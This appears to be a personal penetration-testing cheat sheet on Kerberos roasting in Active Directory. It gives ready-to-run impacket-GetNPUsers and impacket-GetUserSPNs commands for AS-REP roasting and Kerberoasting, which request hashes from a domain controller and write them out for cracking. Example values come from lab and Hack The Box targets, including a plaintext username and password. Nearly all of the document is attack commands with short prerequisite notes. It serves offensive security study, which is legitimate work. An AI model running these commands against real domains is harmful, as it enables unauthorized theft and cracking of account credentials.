# Roasting

## ASREPRoasting

### Execution

```bash
## authenticated
impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip $KDC_IP -request "$DOMAIN/$USER:$PASSWD"
# impacket-GetNPUsers -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.68.64 -request 'CONTOSO.ORG/TestAlpha:win10-gui-P@$swd'
# use 'CONTOSO.ORG/' for unauthenticated bind

## with hashes
impacket-GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -hashes "$LM_HASH:$NT_HASH" -dc-ip $KDC_IP "$DOMAIN/$USER"
```

### Prerequisites

1) At least one user on the domain is configured with DONT_REQ_PREAUTH attribute (not default)

## TGSREPRoasting

### Execution

- request TGS' for **user** accounts that have an SPN

```bash
# perform kerberoasting without preauth (AS-REQ) (when a user has DONT_REQ_PREAUTH)
impacket-GetUserSPNs -no-preauth "$USER" -usersfile $USERS_FILE -dc-host $KDC_IP $DOMAIN/ -request
# impacket-GetUserSPNs -no-preauth "AltAdmLocal" -usersfile users.txt -dc-host 192.168.68.64 contoso.org/ -request

# perform kerberoasting knowing user's password
impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip $KDC "$DOMAIN/$USER:$PASSWD"
# impacket-GetUserSPNs -outputfile kerberoastables.txt -dc-ip 192.168.68.64 'contoso.org/TestAlpha:win10-gui-P@$swd'


# request a TGS for a single specific kerberoastable user (Ethan, in this case)
impacket-GetUserSPNs -request-user 'ethan' -dc-ip 10.10.11.42 'administrator.htb'/'emily':'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

### Prerequisites

1. The ability to request a TGS for a particular service using a TGS-REQ (i.e. (1) user logon-session key in LSA cache (obtained using user's kerberos key (derived from user's NT hash) only from the previously requested AS-REP) and (2) a TGT for that user)
        1. **OR** using AS-REQ (an account with DoNotRequirePreauth set, see HTB Rebound box).
2. The service account's password that you request TGS for should be configured by human (otherwise it would be nearly impossible to crack). In fact, `impacket-GetUserSPNs` utility only requests TGSs for **user** accounts that have an SPN.
